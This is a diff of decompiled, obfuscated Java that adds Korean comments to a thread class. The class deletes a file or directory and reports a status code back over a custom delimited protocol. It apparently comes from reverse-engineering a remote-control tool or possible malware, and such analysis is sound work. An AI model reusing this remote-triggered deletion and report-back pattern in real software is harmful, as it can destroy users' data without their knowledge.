@@ -25,7 +25,7 @@ final class b extends Thread {
 
       String var6;
       if (var1.exists()) {
-         this.b = org.a.a.a.b.a(var1);
+         this.b = org.a.a.a.b.a(var1); // var1 디렉토리가 존재하면 삭제하고 true, 존재하지 않으면 false
          if (this.b) {
             var6 = "1";
          } else {
@@ -34,8 +34,10 @@ final class b extends Thread {
       } else {
          var6 = "2";
       }
+      //var6 - 1: var1 파일 존재, 디렉토리 존재 / 0: var1 파일 존재, 디렉토리 존재X / 2: var1 파일 존재X
 
       try {
+         // [k.g]$#@@0008$#@[1 or 0 or 2]$#@[this.c]$#@&&&
          var2.writeBytes(k.g + k.d + k.E + k.d + var6 + k.d + this.c + k.d + "&&&");
       } catch (Exception var4) {
          var4.printStackTrace();
